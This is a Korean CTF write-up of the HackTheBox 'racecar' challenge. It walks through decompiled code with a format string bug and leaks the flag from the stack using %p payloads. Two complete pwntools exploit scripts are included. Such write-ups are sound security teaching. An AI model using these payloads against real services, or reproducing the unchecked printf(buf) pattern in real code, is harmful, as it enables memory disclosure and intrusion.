---
title: "[HackTheBox] racecar"
author: d0razi
date: 2024-01-20 11:43
categories: [InfoSec, Pwn]
tags: [Write up, HTB]
image: /assets/img/media/banner/HTB.jpg
---

# 문제 풀이

파일은 바이너리만 제공해주고, 보호기법은 모두 적용되어 있네요.

```bash
❯ ls
racecar
❯ checksec racecar
[*] '/HTB/pwn_racecar/racecar'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

먼저 IDA로 디컴파일을 해보고 오디팅을 했습니다.

코드를 보다가 **`car_menu`** 함수에서 취약한 부분을 찾았습니다.
## car_menu 분석

```c
int car_menu()
{
  unsigned int v0; // eax
  size_t i; // eax
  unsigned int v2; // edx
  int result; // eax
  int v4; // [esp+0h] [ebp-58h]
  int v5; // [esp+4h] [ebp-54h]
  unsigned int v6; // [esp+8h] [ebp-50h]
  int car_num; // [esp+Ch] [ebp-4Ch]
  int race_num; // [esp+10h] [ebp-48h]
  void *buf; // [esp+18h] [ebp-40h]
  FILE *flag; // [esp+1Ch] [ebp-3Ch]
  char v11[44]; // [esp+20h] [ebp-38h] BYREF
  unsigned int v12; // [esp+4Ch] [ebp-Ch]

  v12 = __readgsdword(0x14u);
  do
  {
    printf(aSelectCar1);
    car_num = read_int();                       // car 선택
    if ( car_num != 2 && car_num != 1 )
      printf("\n%s[-] Invalid choice!%s\n", "\x1B[1;31m", "\x1B[1;36m");
  }
  while ( car_num != 2 && car_num != 1 );
  race_num = race_type();                       // race_type 내부에서 race 선택
  v0 = time(0);
  srand(v0);
  if ( car_num == 1 && race_num == 2 || car_num == 2 && race_num == 2 )// 경기 시작
  {
    v4 = rand() % 10;                           // 0 ~ 9
    v5 = rand() % 100;                          // 0 ~ 99
  }
  else if ( car_num == 1 && race_num == 1 || car_num == 2 && race_num == 1 )
  {
    v4 = rand() % 100;                          // 0 ~ 99
    v5 = rand() % 10;                           // 0 ~ 9
  }
  else
  {
    v4 = rand() % 100;                          // 0 ~ 99
    v5 = rand() % 100;                          // 0 ~ 99
  }                                             // 경기 끝
  v6 = 0;
  for ( i = strlen("\n[*] Waiting for the race to finish..."); ; i = strlen("\n[*] Waiting for the race to finish...") )
  {
    v2 = i;
    result = v6;
    if ( v2 <= v6 )
      break;
    putchar(aWaitingForTheR[v6]);
    if ( aWaitingForTheR[v6] == '.' )
      sleep(0);
    ++v6;
  }
  if ( car_num == 1 && (result = v4, v4 < v5) || car_num == 2 && (result = v4, v4 > v5) )// 
                                                // car num 1번(v4%10, v5%100)
                                                // car num 2번(v4%100, v4%10)
  {                                             // 위 if 문을 통과해야 아래 72 Line에 있는 FSB를 발생시킬 수 있습니다.
    printf("%s\n\n[+] You won the race!! You get 100 coins!\n", "\x1B[1;32m");
    coins += 100;
    printf("[+] Current coins: [%d]%s\n", coins, "\x1B[1;36m");
    printf("\n[!] Do you have anything to say to the press after your big victory?\n> %s", "\x1B[0m");
    buf = malloc(0x171u);
    flag = fopen("flag.txt", "r");              // flag.txt 파일을 제공 안해주기 때문에 만들어야합니다.
    if ( !flag )
    {
      printf("%s[-] Could not open flag.txt. Please contact the creator.\n", "\x1B[1;31m");
      exit(105);
    }
    fgets(v11, 44, flag);                       // 44개 문자를 복사하기 때문에 플래그는 44글자인걸 알 수 있습니다.
    read(0, buf, 0x170u);
    puts("\n\x1B[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \x1B[0m");
    return printf((const char *)buf);           // Format String Bug occurs
  }
  else if ( car_num == 1 && (result = v4, v4 > v5) || car_num == 2 && (result = v4, v4 < v5) )
  {
    printf("%s\n\n[-] You lost the race and all your coins!\n", "\x1B[1;31m");
    coins = 0;
    return printf("[+] Current coins: [%d]%s\n", 0, "\x1B[1;36m");
  }
  return result;
}
```

제가 IDA로 분석하면서 이해하기 쉽게 주석들을 적어두었기 때문에 한번 쭉 읽어보시길 권장드립니다.

먼저 FSB가 발생하는 코드 부분을 분석해보겠습니다.
```c
  if ( car_num == 1 && (result = v4, v4 < v5) || car_num == 2 && (result = v4, v4 > v5) )// 
                                                // car num 1번(v4%10, v5%100)
                                                // car num 2번(v4%100, v4%10)
  {                                             // 위 if 문을 통과해야 아래 72 Line에 있는 FSB를 발생시킬 수 있습니다.
    printf("%s\n\n[+] You won the race!! You get 100 coins!\n", "\x1B[1;32m");
    coins += 100;
    printf("[+] Current coins: [%d]%s\n", coins, "\x1B[1;36m");
    printf("\n[!] Do you have anything to say to the press after your big victory?\n> %s", "\x1B[0m");
    buf = malloc(0x171u);
    flag = fopen("flag.txt", "r");              // flag.txt 파일을 제공 안해주기 때문에 만들어야합니다.
    if ( !flag )
    {
      printf("%s[-] Could not open flag.txt. Please contact the creator.\n", "\x1B[1;31m");
      exit(105);
    }
    fgets(v11, 44, flag);                       // 44개 문자를 복사하기 때문에 플래그는 44글자인걸 알 수 있습니다.
    read(0, buf, 0x170u);
    puts("\n\x1B[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \x1B[0m");
    return printf((const char *)buf);           // Format String Bug occurs
  }
```

플래그는 fopen으로 스택에 넣어주기 때문에 FSB로 출력해주는 시나리오를 생각할 수 있습니다.
### if문 통과

if 문을 통과해야 **`return printf((const cahr *)buf);`** 이 코드를 실행시켜서 FSB를 발생시켜 플래그를 읽을 수 있기 때문에 if문을 통과하는 조건문을 분석해보겠습니다.
```c
 if ( car_num == 1 && (result = v4, v4 < v5) || car_num == 2 && (result = v4, v4 > v5) )// 
                                                // car num 1번(v4%10, v5%100)
                                                // car num 2번(v4%100, v4%10)
```

car를 1번 선택하면 v4가 v5보다 작아야하고, 2번을 선택하면 v5가 v4보다 작아야합니다.
코드 위쪽을 보면 v4, v5 값을 설정하는 코드를 볼 수 있습니다.

```c
if ( car_num == 1 && race_num == 2 || car_num == 2 && race_num == 2 )// 경기 시작
  {
    v4 = rand() % 10;                           // 0 ~ 9
    v5 = rand() % 100;                          // 0 ~ 99
  }
else if ( car_num == 1 && race_num == 1 || car_num == 2 && race_num == 1 )
  {
    v4 = rand() % 100;                          // 0 ~ 99
    v5 = rand() % 10;                           // 0 ~ 9
  }
```

car를 1번 선택하고 race를 2번 선택하면 v4 < v5 가 만족되기 때문에 car = 1, race = 2 를 선택하겠습니다.
### FSB
```c
    buf = malloc(0x171u);
    flag = fopen("flag.txt", "r");              // flag.txt 파일을 제공 안해주기 때문에 만들어야합니다.
    if ( !flag )
    {
      printf("%s[-] Could not open flag.txt. Please contact the creator.\n", "\x1B[1;31m");
      exit(105);
    }
    fgets(v11, 44, flag);                       // 44개 문자를 복사하기 때문에 플래그는 44글자인걸 알 수 있습니다.
    read(0, buf, 0x170u);
    puts("\n\x1B[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \x1B[0m");
    return printf((const char *)buf);           // Format String Bug occurs
  }
```
<br>
flag.txt 를 읽어오고 그 파일을 v11 변수에 읽으면서 플래그를 스택에 넣어놓습니다. 그리고 buf에 입력받은 내용을 그대로 printf 함수로 출력해주면서 FSB가 발생합니다. 
<br>
FSB로 스택에 있는 플래그를 출력할 수 있는지 확인해보기 위해 flag.txt를 만들고 %p를 입력해봤습니다.
```bash
❯ cat flag.txt
ABCDABCDABCDABCDABCDABCDABCDABCDABCDABCDABCD
```

```bash
❯ ./racecar

🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌
      ______                                       |xxx|
     /|_||_\`.__                                   | F |
    (   _    _ _\                                  |xxx|
*** =`-(_)--(_)-'                                  | I |
                                                   |xxx|
                                                   | N |
                                                   |xxx|
                                                   | I |
                                                   |xxx|
             _-_-  _/\______\__                    | S |
           _-_-__ / ,-. -|-  ,-.`-.                |xxx|
            _-_- `( o )----( o )-'                 | H |
                   `-'      `-'                    |xxx|
🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌🎌

Insert your data:

Name:
Nickname:

[+] Welcome []!

[*] Your name is [] but everybody calls you.. []!
[*] Current coins: [69]

1. Car info
2. Car selection
> 2

Select car:
1. 🚗
2. 🏎️
> 1

Select race:
1. Highway battle
2. Circuit
> 2

[*] Waiting for the race to finish...

[+] You won the race!! You get 100 coins!
[+] Current coins: [169]

[!] Do you have anything to say to the press after your big victory?
> %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.

The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this:
0x57eb9200.0x170.0x5659cd85.0x4.0x11.0x26.0x1.0x2.0x5659d96c.0x57eb9200.0x57eb9380.0x44434241.
```
<br>
12번째부터 flag.txt의 첫 4글자가 hex 값으로 출력이 됩니다. 그러면 플래그가 총 44글자고 %p 하나에 4글자가 출력되니 12번째 %p부터 23번째 %p까지 플래그가 출력될 것 입니다.

**`%p%p%p%p%p%p%p%p%p%p%p.%p%p%p%p%p%p%p%p%p%p%p`** 이렇게 입력하면 . 뒤부터 hex값으로 된 flag.txt의 내용이 출력되어서 플래그 값을 읽을 수 있습니다.
```bash
Name:
Nickname:

[+] Welcome []!

[*] Your name is [] but everybody calls you.. []!
[*] Current coins: [69]

1. Car info
2. Car selection
> 2


Select car:
1. 🚗
2. 🏎️
> 1


Select race:
1. Highway battle
2. Circuit
> 2

[*] Waiting for the race to finish...

[+] You won the race!! You get 100 coins!
[+] Current coins: [169]

[!] Do you have anything to say to the press after your big victory?
> %p%p%p%p%p%p%p%p%p%p%p.%p%p%p%p%p%p%p%p%p%p%p

The Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this:
0x5780d1c00x1700x565b7d850x90x180x260x10x20x565b896c0x5780d1c00x5780d340.0x7b4254480x5f7968770x5f6431640x34735f310x745f33760x665f33680x5f67346c0x745f6e300x355f33680x6b6334740x7d213f
```

출력된 **`0x7b4254480x5f7968770x5f6431640x34735f310x745f33760x665f33680x5f67346c0x745f6e300x355f33680x6b6334740x7d213f`** 값에서 0x를 제거하고 빅엔디언으로 바꾼뒤 ASCII 문자로 변경해보면 아래와 같습니다.

![](https://i.imgur.com/nQnB7WW.png)

![](https://i.imgur.com/UEjQXGu.png)

플래그가 출력됐습니다. 4바이트씩 잘라서 앞뒤만 변경해주면 제대로 된 플래그가 나올 것입니다.

최종 익스플로잇 코드는 아래와 같습니다.
# 익스플로잇

```python
from pwn import *
import re

p = process('./racecar')
#p = remote('159.65.20.166', 31441)

def hex_to_char(s):
    return ''.join(''.join(chr(int(c[i:i+2], 16)) for i in reversed(range(0, len(c), 2))) for c in s.split('0x')[1:])

p.sendlineafter(b'Name:', b'')
p.sendlineafter(b'Nickname:', b'')
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'> ', b'2')

p.sendlineafter(b'> ', b'%p%p%p%p%p%p%p%p%p%p%p.%p%p%p%p%p%p%p%p%p%p%p')

p.recvline()
p.recvline()
p.recvuntil(b'.')
flag = str(p.recvuntil(b'\n')[:-1])[2:-1]
flag = hex_to_char(flag)
print(flag)
```

![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2F6dPqX%2FbtsDIydE1DD%2FlkK1kktd73sHPm25oYdwMK%2Fimg.png)

## 다른 익스 코드

문제를 다 풀고 해당 문제의 블로그 글들을 찾아봤는데 pwntools의 p32() 함수를 사용하면 더 쉽게 플래그 복호화가 가능했습니다.

```python
from pwn import *

p = process('./racecar')

def convert_flag(flag):
    decode = []
    for element in flag.split('0x')[1:]:
        decode.append(p32(int('0x' + element, 16)))

    return b''.join(decode).decode().rstrip('\x00')

p.sendlineafter(b'Name:', b'')
p.sendlineafter(b'Nickname:', b'')
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'> ', b'2')

p.sendlineafter(b'> ', b'%p%p%p%p%p%p%p%p%p%p%p.%p%p%p%p%p%p%p%p%p%p%p')

p.recvline()
p.recvline()
p.recvuntil(b'.')
flag = str(p.recvuntil(b'\n')[:-1])[2:-1]
flag = convert_flag(flag)
print(flag)
```